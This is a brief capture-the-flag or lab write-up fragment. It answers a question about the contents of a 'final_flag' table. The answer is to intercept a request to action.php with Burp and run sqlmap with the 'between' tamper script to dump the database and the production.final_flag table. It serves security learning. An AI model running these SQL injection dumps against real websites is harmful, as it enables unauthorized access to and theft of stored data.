**What's the contents of table final_flag?
- Run Burp, intercept action.php on shop.html page and save to a file
```
sqlmap -r file.txt
sqlmap -r file.txt --tamper=between --batch --dump
sqlmap -r page.txt --tamper=between --batch --dump -D production -T final_flag
```
